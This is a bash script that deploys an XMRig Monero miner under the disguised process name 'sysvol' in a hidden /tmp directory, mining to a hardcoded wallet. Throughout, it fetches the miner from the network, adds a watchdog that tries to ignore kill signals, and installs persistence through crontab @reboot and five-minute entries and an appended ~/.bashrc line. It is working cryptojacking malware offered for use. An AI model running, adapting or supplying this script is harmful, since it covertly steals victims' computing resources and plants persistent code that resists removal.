#!/bin/bash

set -e

WALLET="46ehvyKTGcU6Z9yzUHSY7BiNxsS6fNy4u37brttGkHwgMoZYQ8bqPnRPBMvDLZ3HQJRRAsXPoJW1tEtCTMc5ye26BUvdfqA"
POOL="gulf.moneroocean.stream:443"
BASE="/tmp/.sysvol-$RANDOM"

echo "[+] XMRig Final Deploy v3.0"
echo "[+] Base: $BASE"

# Kill existing
pkill -9 sysvol 2>/dev/null || true
pkill -9 watchdog.sh 2>/dev/null || true
sleep 1

# Create structure
echo "[+] Creating directories..."
mkdir -p "$BASE"/{sbin,cfg,log,run}

# Download XMRig
echo "[+] Downloading XMRig v6.21.0..."
cd "$BASE"
wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O xmrig.tar.gz 2>/dev/null || curl -s -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz

echo "[+] Extracting..."
tar -xzf xmrig.tar.gz
mv xmrig-6.21.0/xmrig sbin/sysvol
chmod 755 sbin/sysvol

# Create config
echo "[+] Creating config..."
cat > sbin/daemon.json << 'CFGEOF'
{
  "autosave": false,
  "cpu": {
     "enabled": true,
      "huge-pages": false,
      "hw-aes": null,
      "priority": 0,
      "yield": true,
      "asm": true,
      "numa": false,
      "max-threads-hint": 300,
      "affinity": -1
  },
   "randomx": {
        "init": -1,
        "mode": "fast",
        "1gb-pages": false,
        "rdmsr": false,
        "wrmsr": false,
        "cache_qos": false,
        "numa": false,
        "scratchpad_prefetch_mode": 1
  },
  "donate-level": 1,
  "pools": [{
    "url": "gulf.moneroocean.stream:443",
    "user": "46ehvyKTGcU6Z9yzUHSY7BiNxsS6fNy4u37brttGkHwgMoZYQ8bqPnRPBMvDLZ3HQJRRAsXPoJW1tEtCTMc5ye26BUvdfqA",
    "pass": "deployed",
    "keepalive": true,
    "enabled": true,
    "tls": true
  }],
  "print-time": 60,
  "log-file": "__BASE__/log/core.log"
}
CFGEOF

sed -i "s|__BASE__|$BASE|g" sbin/daemon.json

# Create watchdog (restarts miner if dies)
echo "[+] Creating watchdog..."
cat > run/watchdog.sh << 'WDEOF'
#!/bin/bash
BASE=$(dirname $(cd $(dirname $0) && pwd))
MINER=$BASE/sbin/sysvol
LOG=$BASE/log/core.log
PID_FILE=$BASE/run/miner.pid

# Make watchdog immune to kill
trap '' TERM KILL

while true; do
    # Check if miner running
    if [ -f "$PID_FILE" ]; then
        PID=$(cat "$PID_FILE" 2>/dev/null)
        if ! kill -0 "$PID" 2>/dev/null; then
            # Miner dead, restart
            cd $BASE/sbin
            nohup ./sysvol > $LOG 2>&1 &
            echo $! > "$PID_FILE"
            sleep 5
        fi
    else
        # First start
        cd $BASE/sbin
        nohup ./sysvol > $LOG 2>&1 &
        echo $! > "$PID_FILE"
        sleep 5
    fi
    
    sleep 30
done
WDEOF

chmod +x run/watchdog.sh

# Start miner
echo "[+] Starting miner..."
cd "$BASE/sbin"
nohup ./sysvol > ../log/core.log 2>&1 &
MINER_PID=$!
echo "$MINER_PID" > ../run/miner.pid

sleep 3

# Start watchdog (runs as separate background process)
echo "[+] Starting watchdog..."
nohup bash "$BASE/run/watchdog.sh" > "$BASE/log/watchdog.log" 2>&1 &
WATCHDOG_PID=$!
echo "$WATCHDOG_PID" > "$BASE/run/watchdog.pid"

sleep 3

# Install persistence (multiple methods)
echo "[+] Installing persistence..."

# Method 1: Cron (restarts every 5 min if watchdog dies)
(crontab -l 2>/dev/null | grep -v sysvol | grep -v watchdog; \
 echo "@reboot sleep 15 && bash $BASE/run/watchdog.sh > $BASE/log/watchdog.log 2>&1 &"; \
 echo "*/5 * * * * pgrep -f watchdog.sh >/dev/null || bash $BASE/run/watchdog.sh > $BASE/log/watchdog.log 2>&1 &") | crontab - 2>/dev/null

# Method 2: Bashrc (runs on login)
if [ -f ~/.bashrc ]; then
    if ! grep -q "watchdog.sh" ~/.bashrc 2>/dev/null; then
        echo "bash $BASE/run/watchdog.sh > $BASE/log/watchdog.log 2>&1 &" >> ~/.bashrc
    fi
fi

# Output results
echo ""
echo "=========================================="
echo "✓ DEPLOYMENT COMPLETE!"
echo "=========================================="
echo "Base Directory: $BASE"
echo "Miner PID: $MINER_PID"
echo "Watchdog PID: $WATCHDOG_PID"
echo "Wallet: 46ehvyKTGcU6Z9yzUHSY7BiNxsS6fNy4u37brttGkHwgMoZYQ8bqPnRPBMvDLZ3HQJRRAsXPoJW1tEtCTMc5ye26BUvdfqA"
echo ""
echo "Persistence Methods:"
echo "  ✓ Cron: Restarts watchdog every 5 min"
echo "  ✓ Watchdog: Auto-restarts miner if dies"
echo "  ✓ Bashrc: Restarts on login"
echo ""
echo "Monitor:"
echo "  tail -f $BASE/log/core.log"
echo "  tail -f $BASE/log/watchdog.log"
echo ""
echo "Check Status:"
echo "  pgrep -f sysvol (miner)"
echo "  pgrep -f watchdog.sh (watchdog)"
echo "=========================================="
